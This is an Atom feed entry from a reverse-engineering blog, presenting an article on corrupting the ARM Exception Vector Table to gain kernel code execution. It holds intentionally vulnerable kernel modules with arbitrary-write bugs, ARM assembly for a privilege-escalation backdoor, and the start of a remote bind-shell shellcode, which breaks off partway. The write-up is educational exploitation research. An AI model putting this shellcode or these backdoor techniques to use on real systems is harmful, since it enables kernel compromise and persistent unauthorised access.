@@ -1,0 +1,227 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Diary of a reverse-engineer - Amat "acez" Cama</title><link href="/" rel="alternate"></link><link href="doar-e.github.io/feeds/author.amat-acez-cama.atom.xml" rel="self"></link><id>/</id><updated>2014-04-30T21:01:00-07:00</updated><entry><title>Corrupting the ARM Exception Vector Table</title><link href="/blog/2014/04/30/corrupting-arm-evt/" rel="alternate"></link><published>2014-04-30T21:01:00-07:00</published><updated>2014-04-30T21:01:00-07:00</updated><author><name>Amat "acez" Cama</name></author><id>tag:None,2014-04-30:/blog/2014/04/30/corrupting-arm-evt/</id><summary type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I thought I'd explore things a little. I chose the ARM architecture mainly because I thought it would be fun to look at. This article is going to describe how the ARM Exception Vector Table (EVT) can aid in kernel exploitation in case an attacker has a write what-where primitive. It will be covering a local exploit scenario as well as a remote exploit scenario. Please note that corrupting the EVT has been mentioned in the paper "Vector Rewrite Attack"&lt;a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf"&gt;[1]&lt;/a&gt;, which briefly talks about how it can be used in NULL pointer dereference vulnerabilities on an ARM RTOS.&lt;/p&gt;
+&lt;p&gt;The article is broken down into two main sections. First a brief description of the ARM EVT and its implications from an exploitation point of view (please note that a number of things about the EVT will be omitted to keep this article relatively short). We will go over two examples showing how we can abuse the EVT.&lt;/p&gt;
+&lt;p&gt;I am assuming the reader is familiar with Linux kernel exploitation and knows some ARM assembly (seriously).&lt;/p&gt;
+</summary><content type="html">&lt;h1 id="introduction"&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;A few months ago, I was writing a Linux kernel exploitation challenge on ARM in an attempt to learn about kernel exploitation and I thought I'd explore things a little. I chose the ARM architecture mainly because I thought it would be fun to look at. This article is going to describe how the ARM Exception Vector Table (EVT) can aid in kernel exploitation in case an attacker has a write what-where primitive. It will be covering a local exploit scenario as well as a remote exploit scenario. Please note that corrupting the EVT has been mentioned in the paper "Vector Rewrite Attack"&lt;a href="http://cansecwest.com/slides07/Vector-Rewrite-Attack.pdf"&gt;[1]&lt;/a&gt;, which briefly talks about how it can be used in NULL pointer dereference vulnerabilities on an ARM RTOS.&lt;/p&gt;
+&lt;p&gt;The article is broken down into two main sections. First a brief description of the ARM EVT and its implications from an exploitation point of view (please note that a number of things about the EVT will be omitted to keep this article relatively short). We will go over two examples showing how we can abuse the EVT.&lt;/p&gt;
+&lt;p&gt;I am assuming the reader is familiar with Linux kernel exploitation and knows some ARM assembly (seriously).&lt;/p&gt;
+
+
+&lt;div class="toc"&gt;&lt;span class="toctitle"&gt;Table of contents:&lt;/span&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#introduction"&gt;Introduction&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#arm-exceptions-and-the-exception-vector-table"&gt;ARM Exceptions and the Exception Vector Table&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#the-exceptions"&gt;The Exceptions&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#the-exception-vector-table"&gt;The Exception Vector Table&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#a-note-about-the-undefined-instruction-exception"&gt;A note about the Undefined Instruction exception&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#corrupting-the-evt"&gt;Corrupting the EVT&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#local-scenario"&gt;Local scenario&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#the-exploit"&gt;The Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#remote-scenario"&gt;Remote scenario&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="#the-exploit_1"&gt;The Exploit&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#bonus-interrupt-stack-overflow"&gt;Bonus: Interrupt Stack Overflow&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="#a-few-things-about-all-this"&gt;A Few Things about all this&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#final-words"&gt;Final words&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="#references"&gt;References&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/div&gt;
+&lt;h1 id="arm-exceptions-and-the-exception-vector-table"&gt;ARM Exceptions and the Exception Vector Table&lt;/h1&gt;
+&lt;p&gt;In a few words, the EVT is to ARM what the IDT is to x86. In the ARM world, an exception is an event that causes the CPU to stop or pause from executing the current set of instructions. When this exception occurs, the CPU diverts execution to another location called an exception handler. There are 7 exception types and each exception type is associated with a mode of operation. Modes of operation affect the processor's "permissions" in regards to system resources. There are in total 7 modes of operation. The following table maps some exception types to their associated modes of operation: &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; Exception                   |       Mode            |     Description
+ ----------------------------|-----------------------|-------------------------------------------------------------------
+ Fast Interrupt Request      |      FIQ              |   interrupts requiring fast response and low latency.
+ Interrupt Request           |      IRQ              |   used for general-purpose interrupt handling.
+ Software Interrupt or RESET |      Supervisor Mode  |   protected mode for the operating system.
+ Prefetch or Data Abort      |      Abort Mode       |   when fetching data or an instruction from invalid/unmmaped memory.
+ Undefined Instruction       |      Undefined Mode   |   when an undefined instruction is executed.
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The other two modes are User Mode which is self explanatory and System Mode which is a privileged user mode for the operating system&lt;/p&gt;
+&lt;h2 id="the-exceptions"&gt;The Exceptions&lt;/h2&gt;
+&lt;p&gt;The exceptions change the processor mode and each exception has access to a set of &lt;em&gt;banked&lt;/em&gt; registers. These can be described as a set of registers that exist only in the exception's context so modifying them will not affect the banked registers of another exception mode. Different exception modes have different banked registers:&lt;/p&gt;
+&lt;p&gt;&lt;center&gt;&lt;img alt="Banked Registers" src="/images/corrupting_arm_evt/banked_regs.png"&gt;&lt;/center&gt;  &lt;/p&gt;
+&lt;h2 id="the-exception-vector-table"&gt;The Exception Vector Table&lt;/h2&gt;
+&lt;p&gt;The vector table is a table that actually contains control transfer instructions that jump to the respective exception handlers. For example, when a software interrupt is raised, execution is transfered to the software interrupt entry in the table which in turn will jump to the syscall handler. Why is the EVT so interesting to target? Well because it is loaded at a known address in memory and it is writeable* and executable. On 32-bit ARM Linux this address is &lt;strong&gt;0xffff0000&lt;/strong&gt;. Each entry in the EVT is also at a known offset as can be seen on the following table:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; Exception                   |       Address            
+ ----------------------------|-----------------------
+ Reset                       |      0xffff0000           
+ Undefined Instruction       |      0xffff0004       
+ SWI                         |      0xffff0008  
+ Prefetch Abort              |      0xffff000c       
+ Data Abort                  |      0xffff0010 
+ Reserved                    |      0xffff0014  
+ IRQ                         |      0xffff0018   
+ FIQ                         |      0xffff001c
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h3 id="a-note-about-the-undefined-instruction-exception"&gt;A note about the Undefined Instruction exception&lt;/h3&gt;
+&lt;p&gt;Overwriting the Undefiend Instruction vector seems like a great plan but it actually isn't because it is used by the kernel. &lt;em&gt;Hard float&lt;/em&gt; and &lt;em&gt;Soft float&lt;/em&gt; are two solutions that allow emulation of floating point instructions since a lot of ARM platforms do not have hardware floating point units. With soft float, the emulation code is added to the userspace application at compile time. With hard float, the kernel lets the userspace application use the floating point instructions as if the CPU supported them and then using the Undefined Instruction exception, it emulates the instruction inside the kernel. &lt;/p&gt;
+&lt;p&gt;If you want to read more on the EVT, checkout the references at the bottom of this article, or google it.&lt;/p&gt;
+&lt;h1 id="corrupting-the-evt"&gt;Corrupting the EVT&lt;/h1&gt;
+&lt;p&gt;There are few vectors we could use in order to obtain privileged code execution. Clearly, overwriting any vector in the table could potentially lead to code execution, but as the lazy people that we are, let's try to do the least amount of work. The easiest one to overwrite seems to be the Software Interrupt vector. It is executing in process context, system calls go through there, all is well. Let's now go through some PoCs/examples. All the following examples have been tested on Debian 7 ARMel 3.2.0-4-versatile running in qemu.&lt;/p&gt;
+&lt;h2 id="local-scenario"&gt;Local scenario&lt;/h2&gt;
+&lt;p&gt;The example vulnerable module implements a char device that has a pretty blatant arbitrary-write vulnerability( or is it a feature?):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// called when &amp;#39;write&amp;#39; system call is done on the device file&lt;/span&gt;
+&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;ssize_t&lt;/span&gt; &lt;span class="nf"&gt;on_write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;filp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="k"&gt;const&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;loff_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;off&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="kt"&gt;size_t&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+    &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;siz&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+        &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+    &lt;span class="k"&gt;else&lt;/span&gt;
+        &lt;span class="k"&gt;goto&lt;/span&gt; &lt;span class="n"&gt;end&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+
+    &lt;span class="n"&gt;copy_from_user&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buff&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+    &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+
+&lt;span class="nl"&gt;end&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;siz&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Basically, with this cool and realistic vulnerability, you give the module an address followed by data to write at that address.
+Now, our plan is going to be to backdoor the kernel by overwriting the SWI exception vector with code that jumps to our backdoor code. This code will check for a magic value in a register (say r7 which holds the syscall number) and if it matches, it will elevate the privileges of the calling process. Where do we store this backdoor code ? Considering the fact that we have an arbitrary write to kernel memory, we can either store it in userspace or somewhere in kernel space. The good thing about the latter choice is that if we choose an appropriate location in kernel space, our code will exist as long as the machine is running, whereas with the former choice, as soon as our user space application exits, the code is lost and if the entry in the EVT isn't set back to its original value, it will most likely be pointing to invalid/unmmapped memory which will crash the system. So we need a location in kernel space that is executable and writeable. Where could this be ? Let's take a closer look at the EVT:&lt;br&gt;
+&lt;center&gt;&lt;img alt="EVT Disassembly" src="/images/corrupting_arm_evt/evt_8i.png"&gt;&lt;/center&gt;&lt;br&gt;
+As expected we see a bunch of control transfer instructions but one thing we notice about them is that "closest" referenced address is &lt;em&gt;0xffff0200&lt;/em&gt;. Let's take a look what is between the end of the EVT and 0xffff0200:&lt;br&gt;
+&lt;center&gt;&lt;img alt="EVT Inspection" src="/images/corrupting_arm_evt/evt_400wx.png"&gt;&lt;/center&gt;&lt;br&gt;
+It looks like nothing is there so we have around 480 bytes to store our backdoor which is more than enough.&lt;/p&gt;
+&lt;h3 id="the-exploit"&gt;The Exploit&lt;/h3&gt;
+&lt;p&gt;Recapitulating our exploit:&lt;br&gt;
+    1. Store our backdoor at &lt;em&gt;0xffff0020&lt;/em&gt;.&lt;br&gt;
+    2. Overwrite the SWI exception vector with a branch to &lt;em&gt;0xffff0020&lt;/em&gt;.&lt;br&gt;
+    3. When a system call occurs, our backdoor will check if r7 == 0xb0000000 and if true, elevate the privileges of the calling process otherwise jump to the normal system call handler.&lt;br&gt;
+Here is the backdoor's code:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;;check if magic&lt;/span&gt;
+    &lt;span class="nf"&gt;cmp&lt;/span&gt;     &lt;span class="nv"&gt;r7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mh"&gt;0xb0000000&lt;/span&gt;
+    &lt;span class="nf"&gt;bne&lt;/span&gt;     &lt;span class="nv"&gt;exit&lt;/span&gt;
+
+&lt;span class="nl"&gt;elevate:&lt;/span&gt;
+    &lt;span class="nf"&gt;stmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+
+    &lt;span class="nf"&gt;mov&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r3&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xc0049a00&lt;/span&gt;     &lt;span class="c1"&gt;;prepare_kernel_cred&lt;/span&gt;
+    &lt;span class="nf"&gt;blx&lt;/span&gt;     &lt;span class="nv"&gt;r3&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xc0049438&lt;/span&gt;     &lt;span class="c1"&gt;;commit_creds&lt;/span&gt;
+    &lt;span class="nf"&gt;blx&lt;/span&gt;     &lt;span class="nv"&gt;r4&lt;/span&gt;
+
+    &lt;span class="nf"&gt;ldmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;  &lt;span class="c1"&gt;;return to userland&lt;/span&gt;
+
+&lt;span class="c1"&gt;;go to syscall handler&lt;/span&gt;
+&lt;span class="nl"&gt;exit:&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;#&lt;/span&gt;&lt;span class="mi"&gt;980&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;      &lt;span class="c1"&gt;;go to normal swi handler&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;You can find the complete code for the vulnerable module and the exploit &lt;a href="https://github.com/acama/arm-evt/tree/master/local_example"&gt;here&lt;/a&gt;. Run the exploit:&lt;br&gt;
+&lt;center&gt;&lt;img alt="Local PoC" src="/images/corrupting_arm_evt/local_poc.png"&gt;&lt;/center&gt;  &lt;/p&gt;
+&lt;h2 id="remote-scenario"&gt;Remote scenario&lt;/h2&gt;
+&lt;p&gt;For this example, we will use a netfilter module with a similar vulnerability as the previous one:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ip&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
+        &lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;tcphdr&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;skb_network_header&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;ip_hdrlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;skb&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+        &lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ntohs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;dest&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;currport&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;9999&lt;/span&gt;&lt;span class="p"&gt;)){&lt;/span&gt;
+            &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)((&lt;/span&gt;&lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tcp&lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;doff&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
+            &lt;span class="n"&gt;where&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+            &lt;span class="n"&gt;len&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;uint8_t&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)))[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
+            &lt;span class="n"&gt;what&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tcp_data&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+            &lt;span class="n"&gt;memcpy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;what&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;len&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+        &lt;span class="p"&gt;}&lt;/span&gt;
+    &lt;span class="p"&gt;}&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Just like the previous example, this module has an awesome feature that allows you to write data to anywhere you want. Connect on port tcp/9999 and just give it an address, followed by the size of the data and the actual data to write there. In this case we will also backdoor the kernel by overwriting the SWI exception vector and backdooring the kernel. The code will branch to our shellcode which we will also, as in the previous example, store at &lt;em&gt;0xffff020&lt;/em&gt;. Overwriting the SWI vector is especially a good idea in this remote scenario because it will allow us to switch from interrupt context to process context. So our backdoor will be executing in a context with a backing process and we will be able to "hijack" this process and overwrite its code segment with a bind shell or connect back shell. But let's not do it that way. Let's check something real quick:&lt;br&gt;
+&lt;center&gt;&lt;img alt="cat /proc/self/maps" src="/images/corrupting_arm_evt/proc_self_maps.png"&gt;&lt;/center&gt;&lt;br&gt;
+Would you look at that, on top of everything else, the EVT is a shared memory segment. It is executable from user land and writeable from kernel land*. Instead of overwriting the code segment of a process that is making a system call, let's just store our code in the EVT right after our first stage and just return there.
+Every system call goes through the SWI vector so we won't have to wait too much for a process to get caught in our trap.&lt;/p&gt;
+&lt;h3 id="the-exploit_1"&gt;The Exploit&lt;/h3&gt;
+&lt;p&gt;Our exploit goes:&lt;br&gt;
+    1. Store our first stage and second stage shellcodes at &lt;em&gt;0xffff0020&lt;/em&gt; (one after the other).&lt;br&gt;
+    2. Overwrite the SWI exception vector with a branch to &lt;em&gt;0xffff0020&lt;/em&gt;.&lt;br&gt;
+    3. When a system call occurs, our first stage shellcode will set the link register to the address of our second stage shellcode (which is also stored in the EVT and which will be executed from userland), and then return to userland.&lt;br&gt;
+    4. The calling process will "resume execution" at the address of our second stage which is just a bind shell.  &lt;/p&gt;
+&lt;p&gt;Here is the stage 1-2 shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;stage_1:&lt;/span&gt;
+    &lt;span class="nf"&gt;adr&lt;/span&gt;     &lt;span class="nv"&gt;lr&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;stage_2&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt;    &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;lr&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+    &lt;span class="nf"&gt;stmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xe59ff410&lt;/span&gt;     &lt;span class="c1"&gt;; intial value at 0xffff0008 which is&lt;/span&gt;
+                                &lt;span class="c1"&gt;; ldr     pc, [pc, #1040] ; 0xffff0420&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0xffff0008&lt;/span&gt;
+    &lt;span class="nf"&gt;str&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+    &lt;span class="nf"&gt;ldmfd&lt;/span&gt;   &lt;span class="nb"&gt;sp&lt;/span&gt;&lt;span class="err"&gt;!&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;r12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;pc&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;  &lt;span class="c1"&gt;; return to userland&lt;/span&gt;
+
+&lt;span class="nl"&gt;stage_2:&lt;/span&gt;
+    &lt;span class="nf"&gt;ldr&lt;/span&gt;     &lt;span class="nv"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="mh"&gt;0x6e69622f&lt;/span&gt;     &lt;span class="c1"&gt;; /bin&lt;/span&gt;
